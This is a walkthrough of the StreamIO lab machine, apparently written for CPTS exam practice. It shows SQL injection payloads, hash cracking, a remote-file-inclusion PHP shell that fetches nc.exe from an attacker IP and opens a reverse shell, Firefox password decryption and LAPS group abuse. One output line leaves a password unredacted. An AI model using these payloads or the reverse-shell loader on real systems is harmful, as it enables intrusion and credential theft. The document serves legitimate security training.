+++
title = "StreamIO-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "StreamIO is a medium-difficulty Windows Active Directory machine featuring subdomain enumeration, SQL injection, credential cracking, LFI/RFI vulnerabilities, database enumeration, Firefox credential extraction, and LAPS password disclosure through group membership abuse"
tags = ["CPTS", "HTB", "StreamIO", "CPTS Prep", "Active Directory", "SQL Injection", "LFI", "RFI", "Firefox", "LAPS"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "streamIO.htb" (`10.129.22.223`). The objective was to evaluate the security posture of the target and identify potential escalation paths to full domain compromise.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to domain administrator privileges. The following key findings were identified:

- **Subdomain Discovery:** DNS enumeration and virtual host fuzzing revealed the subdomain `watch.streamio.htb`, hosting a movie search application.

- **SQL Injection Vulnerability:** The search functionality was vulnerable to Union-based SQL injection, allowing extraction of user credentials from the database.

- **Credential Cracking:** Extracted password hashes were cracked, revealing credentials for multiple users including `yoshihide` who had access to the administrative panel.

- **LFI/RFI Vulnerability:** The admin panel contained a debug parameter vulnerable to Local File Inclusion, which was escalated to Remote File Inclusion to execute a malicious PHP shell.

- **Database Credential Discovery:** Source code analysis revealed database credentials, leading to enumeration of a backup database containing additional user hashes.

- **Firefox Credential Extraction:** The user `nikk37` had saved credentials in Firefox, which were extracted using firepwd to obtain credentials for `JDgodd`.

- **Active Directory Group Abuse:** BloodHound analysis revealed that `JDgodd` could add themselves to the `Core Staff` group, which had rights to read LAPS passwords.

- **LAPS Password Retrieval:** After adding themselves to the group, LDAP queries revealed the LAPS password for the local administrator, granting domain admin access.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker with no prior access was able to escalate to domain administrator by chaining together web application vulnerabilities, credential reuse, and Active Directory misconfigurations.

**Recommendations:**

- **Secure SQL Queries:** Implement parameterized queries to prevent SQL injection vulnerabilities.
- **Restrict File Inclusion:** Disable remote file inclusion and validate all file paths to prevent LFI/RFI attacks.
- **Secure Credential Storage:** Avoid storing database credentials in source code and use secure credential management.
- **Browser Credential Security:** Educate users about the risks of saving passwords in browsers and implement group policies to disable password storage.
- **Review Group Memberships:** Regularly audit Active Directory group memberships and remove unnecessary privileges.
- **Secure LAPS:** Ensure LAPS passwords are only accessible to authorized users and monitor for unauthorized access attempts.

## About

StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 13:35:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
|_SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
|_ssl-date: 2025-11-27T13:36:01+00:00; +6h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 1s, median: 6h59m57s
| smb2-time:
|   date: 2025-11-27T13:35:19
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

```
**Findings:** The scan revealed a Windows Domain Controller with multiple open ports including DNS (53/tcp), HTTP (80/tcp), HTTPS (443/tcp), Kerberos (88/tcp), LDAP (389/tcp), SMB (445/tcp), and WinRM (5985/tcp). The SSL certificate revealed the domain `streamIO.htb` and a subdomain `watch.streamIO.htb`.


**2. DNS Enumeration**  
DNS enumeration was performed to gather additional domain information.
```bash
# DNS enumeration
❯ dig ANY streamIO.htb @10.129.22.223

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> ANY streamIO.htb @10.129.22.223
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57440
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamIO.htb.                  IN      ANY

;; ANSWER SECTION:
streamIO.htb.           600     IN      A       10.129.22.223
streamIO.htb.           3600    IN      NS      dc.streamIO.htb.
streamIO.htb.           3600    IN      SOA     dc.streamIO.htb. hostmaster.streamIO.htb. 290 900 600 86400 3600
streamIO.htb.           600     IN      AAAA    dead:beef::382d:4468:fd4d:6957
streamIO.htb.           600     IN      AAAA    dead:beef::1a5
streamIO.htb.           600     IN      AAAA    dead:beef::2166:ea87:142a:804b

;; ADDITIONAL SECTION:
dc.streamIO.htb.        3600    IN      A       10.129.22.223
dc.streamIO.htb.        3600    IN      AAAA    dead:beef::382d:4468:fd4d:6957
dc.streamIO.htb.        3600    IN      AAAA    dead:beef::1a5

;; Query time: 263 msec
;; SERVER: 10.129.22.223#53(10.129.22.223) (TCP)
;; WHEN: Sat Nov 22 19:37:20 +07 2025
;; MSG SIZE  rcvd: 277

❯ dig ANY DC.streamIO.htb @10.129.22.223

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> ANY DC.streamIO.htb @10.129.22.223
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 65064
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC.streamIO.htb.               IN      ANY

;; ANSWER SECTION:
DC.streamIO.htb.        3600    IN      A       10.129.22.223
DC.streamIO.htb.        3600    IN      AAAA    dead:beef::1a5
DC.streamIO.htb.        3600    IN      AAAA    dead:beef::382d:4468:fd4d:6957

;; Query time: 193 msec
;; SERVER: 10.129.22.223#53(10.129.22.223) (TCP)
;; WHEN: Sat Nov 22 19:37:42 +07 2025
;; MSG SIZE  rcvd: 116
```
**Findings:** The domain controller hostname was confirmed as `dc.streamio.htb` with IP address `10.129.22.223`.


**3. Subdomain Discovery**  
Virtual host fuzzing was performed to discover additional subdomains.
```bash 
❯  ffuf -u https://10.129.20.200/ -H 'Host: FUZZ.streamio.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.20.200/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.streamio.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 613ms]
:: Progress: [2780/114441] :: Job [1/1] :: 49 req/sec :: Duration: [0:01:02] :: Errors: 0 ::

```
**Findings:** The subdomain `watch.streamio.htb` was discovered, hosting a movie search application.


### Phase 2: SQL Injection Exploitation

**4. SQL Injection Discovery**  
The search functionality on `watch.streamio.htb` was tested for SQL injection vulnerabilities.

**5. Database Fingerprinting**  
Union-based SQL injection was used to fingerprint the database version.

```bash
uwu' union select 1,@@version,3,4,5,6 --
```


**6. Table Enumeration**  
Database tables were enumerated from the information_schema.

```bash
uwu' union select 1,table_name,3,4,5,6 from information_schema.tables --
```

**7. Column Enumeration**  
Columns from the `users` table were identified
```bash
uwu' union select 1,column_name,3,4,5,6 from information_schema.columns where table_name= 'users' --
```


**8. Data Extraction**  
Usernames and password hashes were extracted from the users table.

```bash
uwu' union select 1,username,3,4,5,6 from users --
uwu' union select 1,password,3,4,5,6 from users --
uwu' union select 1,concat(username,':',password),3,4,5,6 from users --
```


**9. Hash Extraction**  
A curl command was used to extract all username:hash pairs.

```bash 
 
❯ curl -X POST 'https://watch.streamio.htb/search.php' -d 'q=uwu%27%20union%20select%201%2Cconcat%28username%2C%27%3A%27%2Cpassword%29%2C3%2C4%2C5%2C6%20from%20users%20%2D%2D' -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g'| tr -d " \t"
admin:<REDACTED> 
Alexendra:<REDACTED> 
Austin:<REDACTED> 
Barbra:<REDACTED> 
Barry:<REDACTED> 
Baxter:<REDACTED> 
Bruno:<REDACTED> 
Carmon:<REDACTED> 
Clara:<REDACTED> 
Diablo:<REDACTED> 
Garfield:<REDACTED> 
Gloria:<REDACTED> 
James:<REDACTED> 
Juliette:<REDACTED> 
Lauren:<REDACTED> 
Lenord:<REDACTED> 
Lucifer:<REDACTED> 
Michelle:<REDACTED> 
Oliver:<REDACTED> 
Robert:<REDACTED> 
Robin:<REDACTED> 
Sabrina:<REDACTED> 
Samantha:<REDACTED> 
Stan:<REDACTED> 
Thane:<REDACTED> 
Theodore:<REDACTED> 
Victor:<REDACTED> 
Victoria:<REDACTED> 
William:<REDACTED> 
yoshihide:<REDACTED> 

```
**Findings:** Multiple username and MD5 hash pairs were obtained, including:
- `admin:<REDACTED_HASH>`
    
- `yoshihide:<REDACTED_HASH>`
    
- Various other users

### Phase 3: Credential Cracking

**10. Hash Cracking**  
The extracted MD5 hashes were cracked using hashcat with the rockyou wordlist.

```bash 
❯ hashcat usernamesandpassword.txt /usr/share/wordlists/rockyou.txt --user -m 0 --show
admin:<REDACTED>:<REDACTED>
Barry:<REDACTED>:$<REDACTED>
Bruno:<REDACTED>:$<REDACTED>$1991$
Clara:<REDACTED>:%$<REDACTED>
Juliette:<REDACTED>:$<REDACTED>
Lauren:<REDACTED>:##<REDACTED>##
Lenord:<REDACTED>:<REDACTED>
Michelle:<REDACTED>:!?<REDACTED>?!123
Sabrina:<REDACTED>:!!<REDACTED>$
Thane:<REDACTED>:<REDACTED>
Victoria:<REDACTED>:!<REDACTED>!
yoshihide:<REDACTED>:<REDACTED>..
```

**Findings:** Multiple passwords were successfully cracked, including:

- `admin:<REDACTED_HASH>:<REDACTED>`
    
- `Barry:<REDACTED_HASH>:$<REDACTED>`
    
- `yoshihide:<REDACTED_HASH>:<REDACTED>..`
    
- Additional credentials for other users

**11. Login Attempts**  
The cracked credentials were tested against the main site login.

```bash 
❯ hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-27 21:32:32
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: <REDACTED>..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-27 21:32:36

```
**Findings:** The user `yoshihide` with password `<REDACTED>..` successfully authenticated.


### Phase 4: Admin Panel Exploitation

**12. Admin Panel Discovery**  
After logging in as `yoshihide`, access to an admin panel at `/admin/` was discovered.

**13. Parameter Fuzzing**  
The admin panel was fuzzed for additional parameters.

```bash 
❯ wfuzz -u https://streamio.htb/admin/\?FUZZ\= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=<REDACTED_SESSION>" --hh 1678
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001575:   200        49 L     137 W      1712 Ch     "debug"


```
**Findings:** A `debug` parameter was discovered that appeared to include files.

**14. Source Code Analysis**  
The included file revealed the underlying PHP code containing a Remote File Inclusion vulnerability.

```bash 
 ~honeypoop/HTB/C/S/03-Attack-Chains  echo "onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY
2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFs <REDACTED> luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRl❯ echo 

"onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGV<REDACTED> 4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== " | base64 -d
yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
<REDACTED> 
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>base64: invalid input

 ~honeypoop/HTB/C/S/03-Attack-Chains   
```
**Findings:** The decoded source code revealed that the `include` parameter could be used with the `eval(file_get_contents())` function, allowing remote file inclusion if the value was not `index.php`.

**15. RFI Payload Creation**  
A PHP shell was created to download and execute a reverse shell.

```bash 
❯ cat shell.php
system("powershell -c wget http://10.10.16.25/nc.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.16.25 443");

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.20.200 - - [27/Nov/2025 21:58:11] "GET /shell.php HTTP/1.0" 200 -
10.129.20.200 - - [27/Nov/2025 21:58:12] "GET /RunasCs.exe HTTP/1.1" 200 -
10.129.20.200 - - [27/Nov/2025 22:00:22] "GET /shell.php HTTP/1.0" 200 -
10.129.20.200 - - [27/Nov/2025 22:00:24] "GET /nc.exe HTTP/1.1" 200 -

```


**16. RFI Exploitation**  
The RFI vulnerability was exploited to execute the malicious PHP shell.

```bash 
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=lbfv4qc47dj28c4b0mioo5bgdt
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

include=http%3a//10.10.16.25/shell.php
```

**17. Reverse Shell as yoshihide**  
A reverse shell was received as the user `yoshihide`.
```bash 

❯ rlwrap -cAr nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.20.200 50335
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin> whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
streamio\yoshihide S-1-5-21-1470860369-1569627196-4264678630-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

ERROR: Unable to get user claims information.
PS C:\inetpub\streamio.htb\admin>

```


### Phase 5: Database Enumeration

**18. Source Code Review**  
The source code of the web applications was reviewed for credentials.

```bash
cd C:\inetpub
dir -recurse *.php | select-string -pattern "database"
```
**Findings:** Database credentials were discovered in multiple files:

- `streamio.htb\admin\index.php`: `db_admin` with password `<REDACTED>`
    
- `watch.streamio.htb\search.php`: `db_user` with password `<REDACTED>`


**19. Backup Database Enumeration**  
SQLCMD was used to enumerate the backup database.

```powershell
sqlcmd -S localhost -U db_admin -P <REDACTED_PASSWORD> -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
sqlcmd -S localhost -U db_admin -P <REDACTED_PASSWORD> -d streamio_backup -Q "select * from users;"


--------------------------------------------------------------------------------------------------------------------------------
movies
users

(2 rows affected)
PS C:\> sqlcmd -S localhost -U db_admin -P <REDACTED_PASSWORD> -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P <REDACTED_PASSWORD> -d streamio_backup -Q "select * from users;"
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             <REDACTED>
          2 yoshihide                                          <REDACTED>
          3 James                                              <REDACTED>
          4 Theodore                                           <REDACTED>
          5 Samantha                                           <REDACTED>
          6 Lauren                                             <REDACTED>
          7 William                                            <REDACTED>
          8 Sabrina                                            <REDACTED>

(8 rows affected)
PS C:\>

```
**Findings:** Additional user hashes were discovered, including for users `nikk37`, `yoshihide`, and others.


**20. Additional Hash Cracking**  
The new hashes were cracked, revealing credentials for `nikk37`.

```bash 
❯ hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show
nikk37:<REDACTED>:<REDACTED>
yoshihide:<REDACTED>:<REDACTED>..
Lauren:<REDACTED>:##<REDACTED>##
Sabrina:<REDACTED>:!!<REDACTED>$

 ~honeypoop/HTB/C/S/03-Attack-Chains      
```
**Findings:** The password for `nikk37` was cracked as `<REDACTED_PASSWORD>`.



**21. WinRM Access as nikk37**  
The credentials were used to establish a WinRM session.

```bash
❯ nxc winrm 10.129.20.200 -u nikk37 -p '<REDACTED>'
WINRM       10.129.20.200   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
WINRM       10.129.20.200   5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)

 ~honeypoop/HTB/C/S/03-Attack-Chains     
```

### Phase 6: Firefox Credential Extraction

**22. Firefox Profile Discovery**  
The Firefox profile directory was located for user `nikk37`.

```bash

evil-winrm -i 10.129.20.200 -u nikk37 -p '<REDACTED>'


*Evil-WinRM* PS C:\Users\nikk37\Documents> cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> ls


    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json


*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json

Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json to logins.json

Info: Download successful!
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db

Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db

Info: Download successful!
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release>

# Enumerate system information
systeminfo / uname -a

# Check user context
whoami
id

# List running processes
tasklist / ps aux

# Check network interfaces
ipconfig /all / ifconfig -a
```

**23. Credential Database Extraction**  
The `logins.json` and `key4.db` files were downloaded for offline analysis.
**24. Firefox Credential Decryption**  
Firepwd was used to decrypt the Firefox saved credentials.

```bash 
^C
❯ python3 firepwd.py
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'<REDACTED>'
https://slack.streamio.htb:b'nikk37',b'<REDACTED>:)'
https://slack.streamio.htb:b'yoshihide',b'<REDACTED>@12'
https://slack.streamio.htb:b'JDgodd',b'<REDACTED>@12'

```
**Findings:** Decrypted credentials revealed multiple users for `slack.streamio.htb`:

- `admin` with password `<REDACTED>`
    
- `nikk37` with password `<REDACTED>`
    
- `yoshihide` with password `<REDACTED>`
    
- `JDgodd` with password `<REDACTED>`
    

**25. Credential Validation**  
The credentials for `JDgodd` were validated against the domain.

```bash
❯ nxc smb 10.129.20.200 -u slack_users -p slack_pass --continue-on-success
SMB         10.129.20.200   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:None)
SMB         10.129.20.200   445    NONE             [-] \admin:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.20.200   445    NONE             [-] \nikk37:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.20.200   445    NONE             [-] \yoshihide:<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.20.200   445    NONE             [+] \JDgodd:<REDACTED>
```
**Findings:** The credentials were valid for the user `JDgodd`.


### Phase 7: Active Directory Enumeration

**26. BloodHound Enumeration**  
BloodHound was used to map Active Directory relationships.
```bash 
bloodhound-python -c All -u jdgodd -p '<REDACTED>' -ns 10.129.20.200 -d streamio.htb -dc streamio.htb --zip
```
**Findings:** BloodHound revealed that `JDgodd` could add themselves to the `Core Staff` group, which had rights to read LAPS passwords.

### Phase 8: Group Membership Abuse

**27. PowerShell Credential Object**  
A credential object was created for `JDgodd`.

```powershell
$pass = ConvertTo-SecureString '<REDACTED_PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```


**28. Group Membership Addition**  
`JDgodd` was added to the `Core Staff` group.

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

**29. Group Membership Verification**  
The group membership was verified.
```bash 
*Evil-WinRM* PS C:\usernet users jdgodd /domain
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
